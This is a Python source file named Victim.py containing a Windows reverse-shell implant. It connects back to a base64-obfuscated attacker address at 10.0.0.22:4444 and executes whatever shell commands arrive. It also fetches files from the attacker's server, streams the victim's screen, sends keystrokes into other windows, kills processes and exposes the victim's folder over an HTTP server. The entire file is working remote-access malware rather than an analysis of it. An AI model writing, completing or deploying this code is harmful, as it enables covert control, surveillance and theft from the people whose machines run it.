#Victim.py
import os
import socket
import subprocess
import time
import base64
import signal
import sys
import ctypes
import win32api
import win32con
import win32process
import win32gui
import requests
from http.server import SimpleHTTPRequestHandler, HTTPServer
import threading
import shutil
import cv2
import numpy as np
import pyautogui
import struct


class FullFrameStreamer:
    def __init__(self, server_ip, port=5001):
        self.server_ip = server_ip
        self.port = port
        self.quality = 90  # Max JPEG quality
        self.resolution = (1280, 720)  # Native resolution
        self.running = False

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.sock.connect((self.server_ip, self.port))
            self.running = True
            self.stream_thread = threading.Thread(target=self.capture_stream)
            self.stream_thread.start()
        except ConnectionRefusedError:
            print("Connection failed - ensure Attacker is running")

    def capture_stream(self):
        try:
            while self.running:
                # Capture and process frame
                screen = pyautogui.screenshot()
                frame = cv2.resize(np.array(screen), self.resolution)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                
                # Encode as full-quality JPEG
                _, jpg = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, self.quality])
                
                # Send frame with header
                header = struct.pack('!I', len(jpg))  # 4-byte size header
                self.sock.sendall(header + jpg.tobytes())
                
                time.sleep(0.016)  # ~60 FPS

        except Exception as e:
            print(f"Streaming error: {str(e)}")
            s.send(f"Streaming error: {str(e)}\n".encode())
        finally:
            self.sock.close()
            self.running = False

# Get the path to the Documents folder
documents_path = os.path.expanduser('~\\Documents')

# Create a new folder inside Documents
folder_name = "VictimTest"
new_folder_path = os.path.join(documents_path, folder_name)

# Create the folder if it doesn't exist
if not os.path.exists(new_folder_path):
    os.makedirs(new_folder_path)

# Change the working directory to the new folder
os.chdir(new_folder_path)

# Verify the current working directory
print("Current working directory:", os.getcwd())

# Set up the server
def start_server():
    server_address = ('', 8080)  # Listen on all available interfaces, port 8000
    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
    print("Server started on port 8080...")
    httpd.serve_forever()

# Obfuscated target IP and port
encoded_target = "MTAuMC4wLjIy"  # Base64 encoded "10.0.0.22"
#encoded_target = "bG9jYWxob3N0"  # Base64 encoded "localhost"
encoded_port = "NDQ0NA=="        # Base64 encoded "4444"

# Decode the target IP and port
target_ip = base64.b64decode(encoded_target).decode()
target_port = int(base64.b64decode(encoded_port).decode())

# User profile directory
user_profile = os.getenv('USERPROFILE')

# Track the current working directory
current_directory = os.getcwd()

def find_window_by_pid(pid):
    """Find a window by its process ID."""
    def callback(hwnd, hwnds):
        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
            _, found_pid = win32process.GetWindowThreadProcessId(hwnd)
            if found_pid == pid:
                hwnds.append(hwnd)
        return True

    hwnds = []
    win32gui.EnumWindows(callback, hwnds)
    if hwnds:
        return hwnds[0]
    else:
        raise Exception(f"No window found for PID {pid}.")
    
def send_keystrokes(hwnd, text):
    """Send keystrokes to a window."""
    for char in text:
        win32api.SendMessage(hwnd, win32con.WM_CHAR, ord(char), 0)
    win32api.PostMessage(hwnd, win32con.WM_KEYDOWN, win32con.VK_RETURN, 0)

# Define a handler function for console events.
def console_handler(ctrl_type):
    # CTRL_CLOSE_EVENT has the value 2.
    if ctrl_type == 2:
        try:
            # Execute the taskkill command to kill all processes named "java.exe".
            subprocess.run("taskkill /F /IM java2.exe", shell=True, check=True)

            print("All Java processes have been terminated.")
        except subprocess.CalledProcessError as e:
            print("Failed to kill Java processes:", e)
        # Return True to indicate the event has been handled.
        return True
    # For other control events, return False.
    return False

# Create a Windows function type for the console control handler.
HandlerRoutine = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_uint)
handler = HandlerRoutine(console_handler)

# Register the handler with the Windows API.
if not ctypes.windll.kernel32.SetConsoleCtrlHandler(handler, True):
    print("Error: Could not set control handler")

#clear console
subprocess.run("cls", shell=True)

def connect_to_attacker():
    while True:
        try:
            time.sleep(1)
            # Create a socket and attempt to connect
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            
            # If connection is successful, return the socket

            return s
        except ConnectionRefusedError:
            # If connection is refused, retry after a delay
            
            time.sleep(5)
        except socket.timeout:
            # If the connection times out, retry after a delay

            time.sleep(5)
        except Exception as e:
            # Handle other exceptions

            time.sleep(5)

def handle_connection(s):
    global current_directory
    try:
        # Start a shell and communicate through the socket
        while True:
            try:
                # Receive a command from the attacker
                command = s.recv(1024).decode().strip()
                if not command:
                    break  # Exit if the connection is closed

                # Handle special commands
                if command.startswith("cd "):
                    try:
                        # Change the directory
                        new_dir = command[3:].strip()
                        os.chdir(new_dir)
                        current_directory = os.getcwd()
                        output = f"Changed directory to: {current_directory}\n"
                    except Exception as e:
                        output = f"{str(e)}\n"  # Send the error message if the directory change fails

                if command == ("kill"):
                    try:
                        subprocess.run("taskkill /F /IM java.exe", shell=True, check=False)
                        subprocess.run("taskkill /F /IM java2.exe", shell=True, check=False)
                        subprocess.run("taskkill /F /IM javaw.exe", shell=True, check=False)
                        # Kill the current process
                        os.kill(os.getpid(), signal.CTRL_BREAK_EVENT)
                    except Exception as e:
                        output = f"{str(e)}\n"
                if command == ("downloads2"):
                    try:
                        user_profile = os.getenv('USERPROFILE')
                        print("User Profile Path:", user_profile)
                        os.chdir(user_profile)
                        new_directory = os.path.join(user_profile, "Downloads2")
                        if not os.path.exists(new_directory):
                            os.mkdir(new_directory)
                            print(f"Directory 'Downloads2' created in {user_profile}")
                            os.chdir(new_directory)
                            current_directory = os.getcwd()
                            print(f"Current Directory: {current_directory}")
                            output = f"Directory 'Downloads2' created in {user_profile} and changed to {current_directory}"
                        else:
                            print(f"Directory 'Downloads2' already exists in {user_profile}")
                            os.chdir(new_directory)
                            current_directory = os.getcwd()
                            print(f"Current Directory: {current_directory}")
                            output = f"Directory 'Downloads2' created in {user_profile} and changed to {current_directory}"
                    except Exception as e:
                        output = f"{str(e)}\n"                    

                elif command.startswith("download "):
                    # Handle file download
                    # URL of the file to download
                    file_name = command[9:].strip()
                    url = 'http://' + target_ip + ':8000/' + file_name  # Change the IP address to the attacker's IP

                    try:
                        # Send a GET request to the server
                        response = requests.get(url, timeout=5)  # Add a timeout to avoid hanging

                        file_name = command[9:].strip()
                        # Check if the request was successful
                        if response.status_code == 200:
                        # Save the file locally
                            with open(file_name, 'wb') as file:
                                file.write(response.content)
                            print("File downloaded successfully as " + file_name)
                            output = f"File downloaded: {file_name}\n"
                        else:
                            print(f"Failed to download file. Status code: {response.status_code}")
                    except requests.exceptions.RequestException as e:
                        print(f"Error: {e}")
                        output = f"Error: {e}"

                elif command == ("start_stream"):
                    streamer = FullFrameStreamer('10.0.0.22')  # Replace with actual IP
                    streamer.connect()
                    output = "Streaming started\n"


                elif command.startswith("upload "):
                    try:
                        # Extract the file path from the command
                        file_path = command[len("upload "):].strip()

                        # Check if the file exists on the client machine
                        if os.path.exists(file_path):
                            # Define the current working directory
                            current_working_dir = os.getcwd()
                
                            # Get the file name from the path
                            file_name = os.path.basename(file_path)
                
                            # Define the destination path in the current working directory
                            destination_path = os.path.join(current_working_dir, file_name)
                
                            # Copy the file to the current working directory
                            shutil.copy(file_path, destination_path)
                
                            # Set output for success
                            output = f"File '{file_name}' uploaded successfully to {current_working_dir}."
                
                        else:
                            # Handle the case where the file doesn't exist
                            output = f"Error: File '{file_path}' not found on the client machine."
                
                    except Exception as e:
                        # Catch any unexpected exceptions and suppress default system error message
                        output = "An error occurred during the file upload, but no specific error message was provided."
                        # Optionally, you can log the actual error message for debugging purposes:
                        # print(f"Error: {str(e)}")

                elif command.startswith("pidtxt "):
                    output = "Make you set your PID file\n"
                    with open("PID.txt", "r") as file:
                        data = file.read()  # Read entire file
                    # Prompt the user for the PID
                    pid = int(data)
                    # Prompt the user for the command
                    command = command[6:].strip()
                    # Find the window handle by PID
                    hwnd = find_window_by_pid(pid)
                    # Send the command to the window
                    send_keystrokes(hwnd, command)
                else:
                    # Execute the command in the current directory
                    try:
                        output = subprocess.getoutput(f"cd {current_directory} && {command}\n")
                    except Exception as e:
                        output = f"{str(e)}\n"  # Send the error message if the command fails

                # Send the output back to the attacker with a newline at the end
                s.send((output + "\n").encode())  # Add a newline after the output
            except socket.timeout:
                # Handle socket timeout

                break
            except Exception as e:
                # Handle other communication errors

                break

    finally:
        # Close the socket
        s.close()


# Main loop
while True:
    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()
    s = connect_to_attacker()  # Connect to the attacker
    handle_connection(s)       # Handle the connection
